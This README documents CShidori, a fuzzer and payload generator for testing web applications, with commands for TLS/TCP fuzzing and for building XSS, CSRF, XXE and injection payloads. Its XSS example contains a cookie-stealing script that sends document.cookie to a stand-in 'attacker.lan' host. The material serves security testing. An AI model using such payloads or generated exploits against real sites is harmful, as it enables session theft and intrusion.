# CShidori

[![License: GPL v3](https://img.shields.io/badge/License-GPLv3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)
![.DOTNET](https://github.com/Aif4thah/CShidori/actions/workflows/dotnet.yml/badge.svg?branch=main)
[![HitCount](https://hits.dwyl.com/Aif4thah/CShidori.svg?style=flat-square)](http://hits.dwyl.com/Aif4thah/CShidori)
[![contributions welcome](https://img.shields.io/badge/contributions-welcome-brightgreen.svg?style=flat)](https://github.com/dwyl/esta/issues)

**Get Data and Fuzz Your App**

![](Intro.png)

## Real life vulnerabilities discovered by this tool

* Open Redirect: 1
* IDOR: 1
* XSS: 1
* Application Data Leak: 2

## Disclaimer

Usage of all tools on this site for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. We assume no liability and are not responsible for any misuse or damage caused by this site. This tools is provided "as is" without warranty of any kind.

## References

* Taisen: [Website](https://taisen.fr)

* CShidori is part of [SIMPLE project (fr)](https://github.com/Aif4thah/SIMPLE)

* OWASP Web Application Security Testing Guide: [07-Input Validation Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/)

* OWASP Web Application Security Testing Guide: [C-Fuzz Vectors](https://owasp.org/www-project-web-security-testing-guide/v41/6-Appendix/C-Fuzz_Vectors#replacive-fuzzing)

## Fuzzer and Data

### Fuzzer

* TLS Sockets (including HTTPS and other SSL/TLS encapsulated protocols)
* TCP Sockets (TCP layer and OSI 5,6,7 protocols, including HTTP )

### Machine Learning

* CShidori learns and tries to detect vulnerabilities from your fuzzing history
* ML is not miraculous thing, you have to train it for your Apps ;)

### Data Generation Modes 
* Mutation
* XSS
* JSON
* XML
* GET
* CSRF
* XXE
* MSTest
* Encoding
* List Generation

### Payloads

* Chars (default)
* Strings (default)
* DotNet
* Java
* C
* Angular
* JavaScript

## Mutation Fuzzing

### TLS sockets

Put your request in a text file* then start fuzzing with: 

```powershell
.\CShidori.exe -m tls -o ..\testing\ZAP-Post-req.raw -i 127.0.0.1 -p 443
```

You can select data with the "-d" parameter

### TCP Sockets

```powershell
.\CShidori.exe -m tcp -o ..\testing\burp.req -i 127.0.0.1 -p 80
```

#### *how put my Web request in a file ? 
 
	* from ZAP or Burp: right click > copy to file
	* for Chrome: F12 > Network > your request / paylod > view source, copy-past in text file, with a line between request and payload, and "\n" + a new line at the end of the file


### Analyse logs

use the `Import-Csv` cmdlet or the `.\CShidoriLogsViewer.ps1` script. 
You can then parse the logs as powershell objects.

```powershell
. .\CShidoriLogsViewer.ps1
Get-CShidoriLogs .\127-0-0-1-b4e09da3-7e34-46f2-9ce9-6f8b1d3a3019.csv -ResponseMatch "bad" -ExcludeSize 295 -debug   
```

### Speed

1 thread = 70-100 req/s

### Go further with MultiThreading

Edit and execute the `Start-Fuzzing-Function.ps1` script

```powershell
. .\Start-Fuzzing-Function.ps1
Start-Fuzzing
```

## Data Generation

### Mutation

generate 5 mutation (chars and bitflip) for the value "test" :

```powershell
.\CShidori.exe -m mut -o 5 -p test -d Chars
```

### XSS / Injections

wrapp xss command to test multiples injections:

```powershell
.\CShidori.exe -m xss -p 'document.location=\"https://attacker.lan?c=\"+document.cookie'
```

### JSON

Inject java and general payloads in all parameters of a Json request

```powershell
.\CShidori.exe -m json -p ..\testing\test.json -d Java,Strings
```

### XML

Inject .NET payloads in all parameters of an XML request

```powershell
.\CShidori.exe -m xml -p ..\testing\exemple.xml -d DotNet
```

### GET

Inject default payloads in all GET parameters and tests parameters polution

```powershell
.\CShidori.exe -m get -p "?bar=foo&foo=bar"
```

### CSRF

Generate get and post CSRF exploits

```powershell
.\CShidori.exe -m csrf -o get -p http://target.lan -i "name1=value1&name2=value2"
.\CShidori.exe -m csrf -o post -p http://target.lan -i "name1=value1&name2=value2"

```

### XXE

Generate XXE payload

```powershell
.\CShidori.exe -m xxe
```
### MSTEST

Generate Test for Microsoft.VisualStudio.TestTools.UnitTesting (Beta)

```powershell
.\CShidori.exe -m mst -p 'function( \"value1\", 2, FUZZ)' -i FUZZ
```

### Encode

Encode your payload

```powershell
.\CShidori.exe -m enc -p "<script>alert(1)</script>"
```

### List Generation

Generate a payload list

```powershell
.\CShidori.exe -m gen -d Chars,Java
```

## Miscellaneous

### SOAP & XSD

Removed since you can perform it from Visual Studio:
- Merge all XSD files in WSDL file
- Right click on the project and select "Add Service Reference" -> "WCF" -> "enter localPath"
